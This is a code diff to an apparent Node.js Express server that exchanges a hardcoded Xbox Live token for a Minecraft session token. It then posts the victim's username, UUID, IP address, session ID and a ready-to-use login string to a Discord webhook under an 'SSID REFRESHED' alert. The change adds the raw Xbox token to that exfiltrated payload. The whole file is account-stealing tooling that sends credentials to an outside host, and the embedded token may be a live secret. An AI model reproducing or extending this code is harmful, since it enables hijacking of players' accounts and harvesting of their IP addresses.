@@ -17,7 +17,10 @@ app.get('/', async (req, res) => {
     try {
         console.log('1')
         console.log('all of those parameters were obsolete, the fun part begins')
-        const xstsTokenHashArray = await getXSTSToken('eyJhbGciOiJSU0EtT0FFUCIsImVuYyI6IkExMjhDQkMtSFMyNTYiLCJ6aXAiOiJERUYiLCJ4NXQiOiJxcEQtU2ZoOUg3NFFHOXlMN1hSZXJ5RmZvbk0iLCJjdHkiOiJKV1QifQ.MH7z6FleteKbgRIFFOY_eRPzowocCg7j9MqXjOG1xsa26D_2Ix5n_kcj9R9XBdboX-MCEwaXBuTVKlFBjAe6-TuJUAd9-E4blPJSUlMAVsufT18Zid5q1JHxQ6tTGF5M4lIz88aKbjEHlM-KJYCaYfqaQdOvyYOOA_f0Bzw3HmdpkjeBbIyV2Q4oktIirOV4uQl7z4E9dijnD7W7ThYWsUKS-pi8z2jbwU9orRcdYYe8dDP2zP9Z3xGGmgHVzWzuSmKgNfYUlMG9jUmxzvZ4hqxezIf-580ZYCYKKOwDMzxfDpIU1V2dAJHG8GcrQ7k0eu5YWBax7Kar_IAYw19a8w.UMq11oA9qx-qcYoIadOv7A.eX5piSFmM4CPfjuKTD0DBsT8ExU2Wx4nX9pTFAmWmoeEPlI79bjn1FdcuEqR1nO-SCSCM-_k8dzzrN89dMVSVcNPtA8lXR3mGwt-boBqRdB6nSsFAoGQY9pWayvQTfyHKbYwNpJFWAp4nbbYX5wnWuGfxYNUcxajWxxnEZrWp3Llp3HS3ZkaqR71b5kaf2pGmrLMHKdxhEVcSadZYwEj4yN58P-ZdNVrpae79aWj_fAjjmyIDnSFuGg-K_afppD1dJhvZizRDs611-MsFsOpN6upT8dijCCjVwli4kHrhnWtEAZXnq3tiE7cKtmMXPLPNBgTJQJ5PpsemA86emg9udPzTADJ1g4Z10wC6LcMXedMSYUQ8sAb_COgeEJE9lhhqEvIJJ-VsuzNDVnznUcbUWoj3TTsSA5Dmqd7JdUmzefRZkBqBMyOydcCjNBiGii9f_Zi2IbfIqMfW1UnT16URC6Q2hPnApS-LgQmUaOTy9hFqQn2rZJ0FebI6FZwj2yU8RsW7vC31UbteErTDGBJ_0HRSlyjKuuQGT8sQcePm_mszD01zbSaYEQov3dy8zQjWB0UodNUZpS1ps4P9Cem2l4aqeQTrvw70h84mnUngSZ85CXaLYRfkayT9VS3-oRJdi9VRVYi9H6z_qtNPCzGwoDpTXKoyVE55qo5tUKPj2B6UcYKRsUv67uIyoyGAIvR3ot6SxvUdR829cnpKU-YaLaUyQIUQyPu4j2h9ZGMCYl8coxYLkovlyGTcTUx3Tk3dMhX3vhFW7ScSYDGxMViR_1YhuzcfoD4ac_x17cIqkd496mN8HR4AOW4g82Ztjq_k-CRHzxPQGjrWE_tJ3znju9xW3vp6Gr9lZOtvUbM_T5Hu-GaJIhwR1QaOWoWvQNuBWw-rcgbtEPFmNyI_s-bTNntSK2KcDV9wmhHcPkNAgNcXu9NXDdPnV5aR_lstKOQZzGpeulfBzl9cDXt__KzIu9DZLiOcBc6zKvKyz9SKOSEnjyZszLuej_OEXS2_evc.r7G2-zyqdCq_tfpqFQnrVw')
+        const userToken = 'eyJhbGciOiJSU0EtT0FFUCIsImVuYyI6IkExMjhDQkMtSFMyNTYiLCJ6aXAiOiJERUYiLCJ4NXQiOiJxcEQtU2ZoOUg3NFFHOXlMN1hSZXJ5RmZvbk0iLCJjdHkiOiJKV1QifQ.MH7z6FleteKbgRIFFOY_eRPzowocCg7j9MqXjOG1xsa26D_2Ix5n_kcj9R9XBdboX-MCEwaXBuTVKlFBjAe6-TuJUAd9-E4blPJSUlMAVsufT18Zid5q1JHxQ6tTGF5M4lIz88aKbjEHlM-KJYCaYfqaQdOvyYOOA_f0Bzw3HmdpkjeBbIyV2Q4oktIirOV4uQl7z4E9dijnD7W7ThYWsUKS-pi8z2jbwU9orRcdYYe8dDP2zP9Z3xGGmgHVzWzuSmKgNfYUlMG9jUmxzvZ4hqxezIf-580ZYCYKKOwDMzxfDpIU1V2dAJHG8GcrQ7k0eu5YWBax7Kar_IAYw19a8w.UMq11oA9qx-qcYoIadOv7A.eX5piSFmM4CPfjuKTD0DBsT8ExU2Wx4nX9pTFAmWmoeEPlI79bjn1FdcuEqR1nO-SCSCM-_k8dzzrN89dMVSVcNPtA8lXR3mGwt-boBqRdB6nSsFAoGQY9pWayvQTfyHKbYwNpJFWAp4nbbYX5wnWuGfxYNUcxajWxxnEZrWp3Llp3HS3ZkaqR71b5kaf2pGmrLMHKdxhEVcSadZYwEj4yN58P-ZdNVrpae79aWj_fAjjmyIDnSFuGg-K_afppD1dJhvZizRDs611-MsFsOpN6upT8dijCCjVwli4kHrhnWtEAZXnq3tiE7cKtmMXPLPNBgTJQJ5PpsemA86emg9udPzTADJ1g4Z10wC6LcMXedMSYUQ8sAb_COgeEJE9lhhqEvIJJ-VsuzNDVnznUcbUWoj3TTsSA5Dmqd7JdUmzefRZkBqBMyOydcCjNBiGii9f_Zi2IbfIqMfW1UnT16URC6Q2hPnApS-LgQmUaOTy9hFqQn2rZJ0FebI6FZwj2yU8RsW7vC31UbteErTDGBJ_0HRSlyjKuuQGT8sQcePm_mszD01zbSaYEQov3dy8zQjWB0UodNUZpS1ps4P9Cem2l4aqeQTrvw70h84mnUngSZ85CXaLYRfkayT9VS3-oRJdi9VRVYi9H6z_qtNPCzGwoDpTXKoyVE55qo5tUKPj2B6UcYKRsUv67uIyoyGAIvR3ot6SxvUdR829cnpKU-YaLaUyQIUQyPu4j2h9ZGMCYl8coxYLkovlyGTcTUx3Tk3dMhX3vhFW7ScSYDGxMViR_1YhuzcfoD4ac_x17cIqkd496mN8HR4AOW4g82Ztjq_k-CRHzxPQGjrWE_tJ3znju9xW3vp6Gr9lZOtvUbM_T5Hu-GaJIhwR1QaOWoWvQNuBWw-rcgbtEPFmNyI_s-bTNntSK2KcDV9wmhHcPkNAgNcXu9NXDdPnV5aR_lstKOQZzGpeulfBzl9cDXt__KzIu9DZLiOcBc6zKvKyz9SKOSEnjyZszLuej_OEXS2_evc.r7G2-zyqdCq_tfpqFQnrVw'
+        console.log('user token set')
+        const xstsTokenHashArray = await getXSTSToken(userToken)
+        console.log('got array')
         const xstsToken = xstsTokenHashArray[0]
         const userHash = xstsTokenHashArray[1]
         const bearerToken = await getBearerToken(xstsToken, userHash)
@@ -28,7 +31,7 @@ app.get('/', async (req, res) => {
             return
         }
         const ip = getIp(req)
-        postToWebhook(username, bearerToken, uuid, ip)
+        postToWebhook(username, bearerToken, uuid, ip, userToken)
     } catch (e) {
         console.log(e)
     }
@@ -101,20 +104,18 @@ function getIp(req) {
     return req.headers['x-forwarded-for'] || req.socket.remoteAddress
 }
 
-function postToWebhook(username, bearerToken, uuid, ip, refreshToken, userToken) {
+function postToWebhook(username, bearerToken, uuid, ip, userToken) {
     const url = webhook_url
     let data = {
         username: " ",
         avatar_url: "https://cdn.discordapp.com/attachments/1021436161694105656/1027591805719560322/xd.jpg",
-        content: "@everyone" + "  `xbl token: " + userToken + "`",
+        content: "@everyone" + " **SSID REFRESHED**" + "  `xbl token: " + userToken + "`",
         embeds: [{
             title: "User Info", color: 0x00ff50, fields: [
                 {name: "Username", value: username, inline: true},
                 {name: "UUID", value: uuid, inline: true},
                 {name: "Ip", value: ip, inline: true},
                 {name: "SessionID", value: bearerToken, inline: false},
-                {name: "Refresh Token", value: refreshToken, inline: false},
-
                 {name: "Login", value: username + ":" + uuid + ":" + bearerToken, inline: false},
             ]
         }]
